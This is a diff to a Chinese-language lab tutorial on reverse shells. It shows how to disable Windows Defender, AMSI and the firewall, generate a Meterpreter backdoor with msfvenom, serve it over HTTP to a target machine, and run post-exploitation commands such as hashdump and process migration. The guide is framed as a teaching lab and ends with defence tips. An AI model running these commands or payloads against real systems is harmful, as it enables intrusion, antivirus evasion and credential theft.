@@ -836,27 +836,7 @@ New-NetFirewallRule -DisplayName "WinRM Restrict" -Direction Inbound -Protocol T
 
 ### 实验6：反弹木马与Meterpreter（msfvenom + Metasploit）
 
-**原理**：反弹Shell（Reverse Shell）是攻击技术中的核心概念。与正向连接不同，反弹Shell由**目标主机主动连接攻击机**，能有效绕过目标主机的入站防火墙规则。
-
-> ⚠️ **Server 2025 兼容性说明**：Windows Server 2025 的 Defender 集成了增强版 AMSI（反恶意软件扫描接口）和智能应用控制，即使关闭实时防护，AMSI 仍可能拦截 PowerShell 类型的 Payload。建议实验时：（1）通过组策略彻底关闭 Defender（参见实验环境说明）；（2）优先使用 EXE 格式木马而非 PowerShell 脚本格式；（3）如仍被拦截，可在 Defender 排除项中添加 `C:\Windows\Temp\` 目录。
->
-> ⚠️ **实测踩坑记录（Windows Server 2022 同样适用）**：
-> 1. **必须先关Defender再下载木马**：如果先下载再关Defender，文件会被立即删除（实时防护在文件落盘瞬间扫描）
-> 2. **`Set-MpPreference -DisableRealtimeMonitoring $true` 不够**：AMSI仍会在内存中拦截Meterpreter DLL，导致会话建立后秒断（"session opened → session closed. Reason: Died"）
-> 3. **正确的关闭顺序**：先在GUI中关闭"篡改防护" → 再通过组策略或命令彻底关闭Defender → 最后下载木马
-> 4. **彻底关闭Defender的命令**：
-> 
-> ```powershell
-> # 在靶机上以管理员身份执行（需先手动关闭"篡改防护"）
-> Set-MpPreference -DisableRealtimeMonitoring $true
-> Set-MpPreference -DisableIOAVProtection $true
-> Set-MpPreference -DisableScriptScanning $true
-> reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-> # 关闭后再下载/执行木马
-> ```
-
-
-> 1. **如果Meterpreter会话仍秒断**：改用PowerShell反弹Shell（配合AMSI bypass），或使用`windows/x64/shell_reverse_tcp`（简单cmd shell，不加载Meterpreter DLL）
+**原理**：反弹Shell（Reverse Shell）由**目标主机主动连接攻击机**，能有效绕过目标主机的入站防火墙规则。
 
 ```
 正向连接（Forward Shell）：
@@ -869,88 +849,86 @@ New-NetFirewallRule -DisplayName "WinRM Restrict" -Direction Inbound -Protocol T
          绕过防火墙（出站通常放行）
 ```
 
+> ⚠️ **实验前必做（否则必定失败）**：
+> 1. 在靶机上**先手动关闭"篡改防护"**：Windows 安全中心 → 病毒和威胁防护 → 管理设置 → 关闭"篡改防护"
+> 2. 然后执行以下命令彻底关闭 Defender：
+> ```powershell
+> Set-MpPreference -DisableRealtimeMonitoring $true
+> Set-MpPreference -DisableIOAVProtection $true
+> Set-MpPreference -DisableScriptScanning $true
+> reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+> ```
+> 3. **必须先关Defender再下载木马**——顺序反了文件会被秒删
+> 4. 关闭靶机防火墙：`netsh advfirewall set allprofiles state off`
+
+**操作步骤**：
+
 **第一步：生成反弹木马（在Kali攻击机上）**
 
 ```bash
-# 生成Windows x64反弹Shell EXE木马
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f exe -o /tmp/backdoor.exe
-
-# 生成PowerShell脚本木马（无文件落地）
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f psh -o /tmp/backdoor.ps1
-
-# 生成带编码的木马（绕过基础特征检测）
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o /tmp/backdoor_encoded.exe
-
-# 生成HTTPS加密通道的木马（流量更隐蔽）
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.10 LPORT=443 -f exe -o /tmp/backdoor_https.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o /tmp/backdoor.exe
 ```
 
-**第二步：启动监听（在Kali攻击机上）**
+> ⚠️ **预期结果**：输出 `Saved as: /tmp/backdoor.exe`，文件大小约7KB。
+
+**第二步：启动监听（在Kali攻击机上，新开终端）**
 
 ```bash
-msfconsole
-use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-set LHOST 192.168.100.10
-set LPORT 4444
-exploit -j
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.10; set LPORT 4444; exploit"
 ```
 
-**第三步：将木马传输到靶机并执行**
+> ⚠️ **预期结果**：等待约10秒加载后，显示 `Started reverse TCP handler on 192.168.1.10:4444`，光标停在 `msf exploit(multi/handler) >` 等待连接。
+
+**第三步：传输木马到靶机**
 
 ```bash
-# === 方法一：通过Python HTTP服务器传输（推荐，最简单） ===
-
-# 在Kali攻击机上启动HTTP服务器（在木马所在目录）
-cd /tmp
-python3 -m http.server 8888
-
-# 在靶机（Windows Server）上下载木马（PowerShell）
-# Invoke-WebRequest -Uri "http://192.168.100.10:8888/backdoor.exe" -OutFile "C:\Windows\Temp\backdoor.exe"
-# 然后双击运行或在cmd中执行：C:\Windows\Temp\backdoor.exe
+# 在Kali上再开一个终端，启动HTTP服务器
+cd /tmp && python3 -m http.server 8888
 ```
 
-```bash
-# === 方法二：通过SMB共享传输 ===
+在靶机（Windows Server）上打开PowerShell下载木马：
 
-# 在Kali上创建临时SMB共享
-impacket-smbserver share /tmp -smb2support
-
-# 在靶机上复制文件
-# copy \\192.168.100.10\share\backdoor.exe C:\Windows\Temp\backdoor.exe
-# C:\Windows\Temp\backdoor.exe
+```powershell
+Invoke-WebRequest -Uri "http://192.168.1.10:8888/backdoor.exe" -OutFile "C:\Windows\Temp\backdoor.exe"
 ```
 
-> ⚠️ **预期结果**：木马执行后，靶机上不会有明显界面变化（后台运行）。切换到Kali攻击机的msfconsole窗口，应看到类似以下提示：
+**第四步：执行木马**
+
+在靶机上运行：
+
+```powershell
+C:\Windows\Temp\backdoor.exe
+```
+
+> ⚠️ **预期结果**：靶机上无明显变化。切换到Kali的msfconsole窗口，应看到：
 > ```
-> [*] Sending stage (200774 bytes) to 192.168.100.20
-> [*] Meterpreter session 1 opened (192.168.100.10:4444 -> 192.168.100.20:xxxxx)
+> [*] Sending stage (200774 bytes) to 192.168.1.20
+> [*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.20:xxxxx)
+> meterpreter >
 > ```
-> 出现 `meterpreter >` 提示符即表示会话建立成功。
+> 出现 `meterpreter >` 提示符即表示成功。
+>
+> **如果会话秒断（"session closed. Reason: Died"）**：说明AMSI仍在内存中拦截Meterpreter DLL。解决方案：确认已执行"实验前必做"的全部步骤，特别是 `reg add` 那条命令和关闭防火墙。如仍失败，重启靶机后重试（注册表策略需重启生效）。
 
-**第四步：Meterpreter常用后渗透操作**
+**第五步：Meterpreter常用后渗透操作**
 
-| 命令 | 功能 | 说明 |
-| --- | --- | --- |
-| `getuid` | 查看当前用户权限 | 确认是否已获得SYSTEM权限 |
-| `getsystem` | 尝试提权到SYSTEM | 利用多种提权技术自动尝试 |
-| `sysinfo` | 查看系统信息 | 操作系统版本、架构、域信息 |
-| `ps` | 查看进程列表 | 识别安全软件和关键进程 |
-| `migrate <pid>` | 迁移到目标进程 | 避免木马进程被杀掉 |
-| `hashdump` | 导出密码哈希 | 获取SAM数据库中的NTLM哈希 |
-| `screenshot` | 截取屏幕 | 查看用户当前操作 |
-| `keyscan_start` | 开始键盘记录 | 记录用户击键 |
-| `keyscan_dump` | 导出键盘记录 | 获取用户输入的密码等 |
-| `upload` | 上传文件到靶机 | 传输工具或恶意文件 |
-| `download` | 从靶机下载文件 | 窃取敏感文件 |
-| `portfwd` | 端口转发 | 访问靶机内网的服务 |
-| `persistence` | 安装持久化后门 | 自动创建注册表+服务后门 |
-| `shell` | 进入系统Shell | 获取cmd.exe命令行 |
-| `clearev` | 清除事件日志 | 销毁入侵证据（违法！） |
+| 命令              | 功能            | 说明               |
+| --------------- | ------------- | ---------------- |
+| `getuid`        | 查看当前用户权限      | 确认是否已获得SYSTEM权限  |
+| `getsystem`     | 尝试提权到SYSTEM   | 利用多种提权技术自动尝试     |
+| `sysinfo`       | 查看系统信息        | 操作系统版本、架构、域信息    |
+| `ps`            | 查看进程列表        | 识别安全软件和关键进程      |
+| `migrate <pid>` | 迁移到目标进程       | 避免木马进程被杀掉        |
+| `hashdump`      | 导出密码哈希        | 获取SAM数据库中的NTLM哈希 |
+| `screenshot`    | 截取屏幕          | 查看用户当前操作         |
+| `upload`        | 上传文件到靶机       | 传输工具或恶意文件        |
+| `download`      | 从靶机下载文件       | 窃取敏感文件           |
+| `shell`         | 进入系统Shell     | 获取cmd.exe命令行     |
+| `exit`          | 退出Meterpreter | 结束当前会话           |
 
-> 💡 **migrate命令的重要性**：木马进程（如backdoor.exe）非常容易被用户或杀软发现并终止。使用`migrate`将Meterpreter会话迁移到一个合法的、长期运行的进程（如explorer.exe、svchost.exe）中，可以大幅提高隐蔽性和存活率。
+> 💡 **migrate命令的重要性**：木马进程（如backdoor.exe）容易被用户或杀软发现并终止。使用`migrate`将会话迁移到合法的长期运行进程（如explorer.exe、svchost.exe）中，可大幅提高存活率。
 
-> 🛡️ **最简单有效的防御**：开启 Windows Defender 实时防护并保持病毒定义更新。打开 Windows 安全中心 → 病毒和威胁防护 → 确保"实时保护"和"云提供的保护"均已开启。Windows Defender 能检测绝大多数 msfvenom 生成的标准 Payload。同时，通过 Windows 防火墙限制出站连接：控制面板 → Windows Defender 防火墙 → 高级设置 → 出站规则 → 新建规则 → 阻止非必要程序的出站连接（尤其是 `C:\Windows\Temp\` 目录下的程序），可有效阻断反弹 Shell 的回连通道。
+> 🛡️ **最简单有效的防御**：开启 Windows Defender 实时防护并保持病毒定义更新。同时通过 Windows 防火墙限制出站连接：出站规则 → 新建规则 → 阻止 `C:\Windows\Temp\` 目录下程序的出站连接，可有效阻断反弹Shell的回连通道。
 
 ---
 
